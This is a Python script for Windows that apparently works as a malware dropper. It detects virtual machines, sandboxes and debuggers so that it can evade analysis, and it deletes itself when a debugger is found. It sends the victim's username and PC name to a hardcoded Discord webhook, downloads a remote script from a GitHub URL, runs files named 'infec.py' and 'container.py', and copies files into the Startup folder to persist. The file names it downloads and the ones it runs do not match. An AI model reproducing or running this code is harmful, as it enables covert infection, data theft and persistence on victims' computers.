import platform
import os
import winreg
import sys
import requests
import ctypes
import shutil
import time
import psutil

gbh = "https://discord.com/api/webhooks/1264234557973205094/iLm-SBMwDw4r2Tpl7LA5yt8jtdC3oU9aivHn2pb9O7uJPTxwzW3VHYymfhhO_iCpCe4h"

def send_embed(embed):
    payload = {"embeds": [embed]}
    response = requests.post(gbh, json=payload)
    if response.status_code != 200:
        print(f"Failed to send webhook: {response.status_code}")

def check_vm():
    # VM Indicators
    vm_processes = [
        "vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe",
        "vmacthlp.exe", "vmsrvc.exe", "xenservice.exe", "VBoxManage.exe",
        "VBoxHeadless.exe", "VBoxNetDHCP.exe", "VBoxNetNAT.exe", "VMwareUser.exe",
        "VMwareTray.exe", "vmtoolsd.exe", "vmsrvc.exe", "VMwareService.exe",
        "VMwareProcess.exe", "VMwareHostd.exe", "VMwareToolbox.exe",
        "vmsvc.exe", "vmtoolsd.exe", "VBoxSVC.exe",
        # Additional VM Processes
        "jujubox.exe", "pyinstxtractor.exe"
    ]
    
    # VM Drivers
    vm_drivers = [
        "VBoxMouse.sys", "VBoxGuest.sys", "VBoxSF.sys", "VBoxVideo.sys",
        "vmhgfs.sys", "vmxnet.sys", "vmmouse.sys", "vmci.sys", "vmx_svga.sys",
        "vmmouse.sys", "vmmemctl.sys", "vmsrvc.sys", "vmxnet3.sys", "vmmemctl.sys",
        "vmwarewddm.sys", "vmwarevga.sys", "vmwareservice.sys", "vmtoolsd.sys",
        "VBoxGuest.sys", "VBoxSF.sys", "VBoxVideo.sys", "VBoxMouse.sys", "VBoxNetLwf.sys"
    ]

    detected_processes = [proc for proc in vm_processes if proc.lower() in os.popen("tasklist").read().lower()]
    detected_drivers = [driver for driver in vm_drivers if os.path.exists(f"C:\\Windows\\System32\\drivers\\{driver}")]
    
    return detected_processes, detected_drivers

def check_registry_key(key):
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key) as reg_key:
            return True
    except FileNotFoundError:
        return False
    except Exception as e:
        print(e)
        return False

def is_debugging():
    # List of known debugger processes including DIE
    debugger_processes = [
        "pyinstxtractor.exe", "pydbg.exe", "ImmunityDebugger.exe", "OllyDbg.exe", 
        "x64dbg.exe", "WinDbg.exe", "IDA.exe", "Ghidra.exe", "CFF Explorer.exe", 
        "Debugger.exe", "wdbg.exe", "Cheat Engine.exe", "Cutter.exe", "Radare2.exe",
        "Hopper.exe", "Binary Ninja.exe", "JMP.exe", "die.exe", "DetectItEasy.exe",
        "diel.exe"
    ]
    
    # Check if any of the debugger processes are running
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] in debugger_processes:
            return True
    
    # Check for debugger presence using system call
    try:
        kernel32 = ctypes.WinDLL('kernel32')
        is_debugged = kernel32.IsDebuggerPresent()
        if is_debugged:
            return True
    except Exception as e:
        print(f"Error checking debugger presence: {e}")
    
    return False

def delete_self():
    try:
        # Schedule file for deletion on reboot
        os.system(f'ping 127.0.0.1 -n 5 > nul')  # Wait a bit before deleting
        os.remove(sys.argv[0])
    except Exception as e:
        print(f"Error deleting file: {e}")

def detect_vm_and_sandbox():
    # Detect VM and sandbox processes
    detected_processes, detected_drivers = check_vm()
    detected_internal_processes = []
    
    sandbox_processes = [
        "cape.exe", "cape-svc.exe",
        "zenbox.exe", "zenbox-svc.exe"
    ]
    
    # Check if any of the sandbox processes are running
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] in sandbox_processes:
            detected_internal_processes.append(proc.info['name'])
    
    return detected_processes, detected_drivers, detected_internal_processes

pc_username = os.getlogin()
pc_name = platform.node()
platform_name = platform.system()

detected_processes, detected_drivers, detected_internal_processes = detect_vm_and_sandbox()

embed_message = {
    "title": pc_username,
    "color": 0x000000,
    "author": {
        "name": "Virtual Machine Detected / Virus Total Scan",
        "icon_url": "https://img.icons8.com/pastel-glyph/64/security-checked--v1.png"
    },
    "footer": {
        "text": "VM Protection | https://github.com/pyinstance"
    },
    "fields": [
        {"name": "PC Information", "value": f"PC Name: `{pc_name}`\nUsername: `{pc_username}`\nPlatform: `{platform_name}`", "inline": False},
        {"name": "Virtual Machine", "value": "True", "inline": False},
        {"name": "Detected Processes", "value": "\n".join(detected_processes) if detected_processes else "None", "inline": False},
        {"name": "Detected Drivers", "value": "\n".join(detected_drivers) if detected_drivers else "None", "inline": False},
        {"name": "Internal Sandbox Processes", "value": "\n".join(detected_internal_processes) if detected_internal_processes else "None", "inline": False}
    ]
}

if detected_processes or detected_drivers or detected_internal_processes:
    send_embed(embed_message)
    sys.exit(1)
elif is_debugging():
    anti_debug_embed = {
        "title": "Debugger Detected",
        "color": 0x000000,
        "author": {
            "name": "Anti-Debugging Alert",
            "icon_url": "https://img.icons8.com/pastel-glyph/64/security-checked--v1.png"
        },
        "footer": {
            "text": "Anti-Debugging | https://github.com/pyinstance"
        },
        "fields": [
            {"name": "PC Information", "value": f"PC Name: `{pc_name}`\nUsername: `{pc_username}`\nPlatform: `{platform_name}`", "inline": False},
            {"name": "Debugger Detected", "value": "True", "inline": False}
        ]
    }
    send_embed(anti_debug_embed)
    delete_self()
    sys.exit(1)
else:
    urls = [
        'https://raw.githubusercontent.com/sdifru877234/wefg2w/main/exe.py',
    ]
    
    for url in urls:
        response = requests.get(url)
        file_path = os.path.join(os.getenv('TEMP'), os.path.basename(url))
        with open(file_path, 'wb') as file:
            file.write(response.content)

    os.system(f'python {os.path.join(os.getenv("TEMP"), "infec.py")}')
    time.sleep(3)
    os.startfile(f'{os.path.join(os.getenv("TEMP"), "hehe.mp4")}')
    os.system(f'python {os.path.join(os.getenv("TEMP"), "container.py")}')
    time.sleep(2)
    shutil.move(os.path.join(os.getenv('TEMP'), 'infec.py'), os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup\\infec.py'))
    shutil.move(os.path.join(os.getenv('TEMP'), 'libs.py'), os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup\\libs.py'))